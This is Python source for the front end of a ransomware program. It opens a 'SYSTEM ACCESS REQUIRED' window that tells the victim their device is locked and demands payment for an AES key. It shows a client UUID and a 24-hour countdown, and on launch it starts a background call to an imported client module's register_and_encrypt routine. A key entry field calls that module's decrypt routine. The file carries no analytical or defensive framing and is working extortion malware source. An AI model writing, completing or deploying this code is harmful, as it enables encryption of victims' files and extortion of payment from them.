import customtkinter as ctk
import json, os, threading, time, sys, random
from datetime import datetime, timedelta
import client
from PIL import Image

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

DATA_FILE = "access_data.json"
ACCESS_DAYS = 1

def load_or_create_access_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return datetime.fromisoformat(json.load(f)["first_run"])
    now = datetime.now()
    with open(DATA_FILE, "w") as f:
        json.dump({"first_run": now.isoformat()}, f)
    return now

# ✅ CORRECT resource path (works for dev + PyInstaller)
def resource_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)

class Ransom_UI(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("SYSTEM ACCESS REQUIRED")
        self.geometry("720x520")
        self.resizable(False, False)

        self.unlocked = False
        self.animating = False
        self.running = True

        self.neon = "#14ff00"
        self.dark_green = "#0A9900"
        self.alert_red = "#ff0033"
        self.desc_base_text = "Your device has been locked.\nPAY US to get the KEY"

        self.logo_img = ctk.CTkImage(
            light_image=Image.open(resource_path("sigma_cat.png")),
            dark_image=Image.open(resource_path("sigma_cat.png")),
            size=(120, 120)
        )

        self.first_run = load_or_create_access_data()
        self.expire_date = self.first_run + timedelta(days=ACCESS_DAYS)

        ascii_art = r"""
888    d8P  8888888b.  8888888888 888888b.
888   d8P   888  "Y88b 888        888  "88b
888  d8P    888    888 888        888  .88P
888d88K     888    888 8888888    8888888K.
8888888b    888    888 888        888  "Y88b
888  Y88b   888    888 888        888    888
888   Y88b  888  .d88P 888        888   d88P
888    Y88b 8888888P"  8888888888 8888888P"
"""

        header = ctk.CTkFrame(self, fg_color="transparent")
        header.pack(pady=10)

        ctk.CTkLabel(
            header, text=ascii_art, font=("Consolas", 14),
            text_color=self.neon, justify="left"
        ).grid(row=0, column=0, padx=(0, 20))

        ctk.CTkLabel(header, image=self.logo_img, text="").grid(row=0, column=1)

        self.frame = ctk.CTkFrame(self, fg_color="#001800")
        self.frame.pack(padx=20, pady=15, fill="both", expand=True)

        self.desc = ctk.CTkLabel(
            self.frame, text=self.desc_base_text + "█",
            font=("Consolas", 15), text_color=self.dark_green
        )
        self.desc.pack(pady=(15, 10))

        uuid_frame = ctk.CTkFrame(self.frame, fg_color="#001800")
        uuid_frame.pack(pady=6)

        self.uuid_label = ctk.CTkLabel(
            uuid_frame, text=f"Client UUID:\n{client.CLIENT_UUID}",
            font=("Consolas", 12), text_color=self.neon
        )
        self.uuid_label.grid(row=0, column=0, padx=6)

        self.copy_btn = ctk.CTkButton(
            uuid_frame, text="📋 COPY", width=80,
            fg_color=self.dark_green, hover_color=self.neon,
            text_color="black", command=self.copy_uuid
        )
        self.copy_btn.grid(row=0, column=1, padx=6)

        self.timer_label = ctk.CTkLabel(
            self.frame, text="Initializing...",
            font=("Consolas", 18, "bold"), text_color=self.neon
        )
        self.timer_label.pack(pady=5)

        self.entry = ctk.CTkEntry(
            self.frame, placeholder_text="Enter AES KEY...",
            fg_color="#002800", text_color=self.neon
        )
        self.entry.pack(pady=10, padx=20, fill="x")

        self.btn = ctk.CTkButton(
            self.frame, text="ENTER KEY",
            fg_color=self.dark_green, hover_color=self.neon,
            text_color="black", command=self.verify_code
        )
        self.btn.pack(pady=10)

        threading.Thread(target=self.start_backend, daemon=True).start()
        threading.Thread(target=self.blink_cursor, daemon=True).start()
        threading.Thread(target=self.update_timer, daemon=True).start()

    # 🔒 thread-safe UI helper
    def ui(self, fn):
        self.after(0, fn)

    def start_backend(self):
        try:
            client.register_and_encrypt()
        except Exception:
            self.ui(lambda: self.timer_label.configure(
                text="SERVER ERROR ❌", text_color=self.alert_red
            ))

    def blink_cursor(self):
        visible = True
        while self.running and not self.unlocked:
            self.ui(lambda v=visible: self.desc.configure(
                text=self.desc_base_text + ("█" if v else " ")
            ))
            visible = not visible
            time.sleep(0.6)

    def copy_uuid(self):
        self.clipboard_clear()
        self.clipboard_append(client.CLIENT_UUID)
        self.copy_btn.configure(text="COPIED ✓")
        self.after(1000, lambda: self.copy_btn.configure(text="📋 COPY"))

    def glitch_effect(self):
        self.animating = True
        self.ui(lambda: self.entry.configure(state="disabled"))
        self.ui(lambda: self.btn.configure(state="disabled"))

        original = "INVALID KEY ✖"
        chars = "!@#$%^&*()<>?/[]{}|▓▒░"

        for _ in range(15):
            scrambled = "".join(
                random.choice(chars) if random.random() < 0.35 else c
                for c in original
            )
            self.ui(lambda s=scrambled: self.timer_label.configure(
                text=s, text_color=self.alert_red
            ))
            time.sleep(0.04)

        time.sleep(1)
        if not self.unlocked:
            self.ui(lambda: self.entry.configure(state="normal"))
            self.ui(lambda: self.btn.configure(state="normal"))

        self.animating = False

    def verify_code(self):
        if self.unlocked or self.animating:
            return
        key = self.entry.get().strip()
        threading.Thread(target=self.decrypt_flow, args=(key,), daemon=True).start()

    def decrypt_flow(self, key):
        try:
            client.decrypt_with_key(key)
            self.unlocked = True
            self.running = False
            self.ui(lambda: self.timer_label.configure(
                text="ACCESS APPROVED ✓", text_color="#00ff44"
            ))
            self.after(2000, self.destroy)
        except Exception:
            self.glitch_effect()

    def update_timer(self):
        while self.running and not self.unlocked:
            remaining = self.expire_date - datetime.now()
            if remaining.total_seconds() <= 0:
                self.ui(lambda: self.timer_label.configure(
                    text="TIME EXPIRED ❌", text_color=self.alert_red
                ))
                self.after(1500, self.destroy)
                return
            h, r = divmod(remaining.seconds, 3600)
            m, s = divmod(r, 60)
            self.ui(lambda h=h, m=m, s=s: self.timer_label.configure(
                text=f"TIME LEFT: {h}h {m}m {s}s", text_color=self.neon
            ))
            time.sleep(1)

if __name__ == "__main__":
    app = Ransom_UI()
    app.mainloop()
